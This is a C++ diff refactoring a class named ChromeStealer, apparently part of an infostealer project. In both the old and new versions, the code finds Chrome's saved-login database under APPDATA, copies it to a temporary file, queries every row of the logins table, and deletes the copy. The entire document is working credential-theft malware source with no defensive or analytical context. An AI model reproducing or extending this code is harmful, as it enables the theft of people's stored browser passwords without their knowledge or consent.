@@ -3,29 +3,30 @@
 #include "StaticTools.h"
 #include "SQLite3.hpp"
 
-ChromeStealer::ChromeStealer() {
-	appdata_path = std::string(boost::compute::detail::getenv("APPDATA"));
-	path1 = boost::filesystem::path(appdata_path + CHROME_FILE);
+ChromeStealer::ChromeStealer(void)
+{
+	_appdataPath = std::string(boost::compute::detail::getenv("APPDATA"));
+	_loginDatabasePath = boost::filesystem::path(_appdataPath + CHROME_FILE);
 }
 
-ChromeStealer::~ChromeStealer() {
-	
+ChromeStealer::~ChromeStealer(void)
+{	
 }
 
 const bool ChromeStealer::canSteal(void) const
 {
-	return boost::filesystem::exists(path1);
+	return boost::filesystem::exists(_loginDatabasePath);
 }
 
 const std::string ChromeStealer::stealPasswordList(void) const
 {
-	boost::filesystem::copy_file(path1, appdata_path + "\\Login Data", boost::filesystem::copy_option::overwrite_if_exists);
-	std::string path = appdata_path + "\\Login Data";
 	std::string ret;
-	SQLite3 Sq(path);
-	std::string q = "SELECT * FROM logins;";
-	ret = Sq.execute(q);
-	Sq.close();
-	boost::filesystem::remove(appdata_path + "\\Login Data");
+	std::string tmp = StaticTools::GetProjectResourceDirectory() + "\\GoogleChromeLoginData";
+
+	boost::filesystem::copy_file(_loginDatabasePath, tmp, boost::filesystem::copy_option::overwrite_if_exists);
+	SQLite3 database(tmp);
+	ret = database.execute("SELECT * FROM logins;");
+	database.close();
+	boost::filesystem::remove(tmp);
 	return (ret);
 }
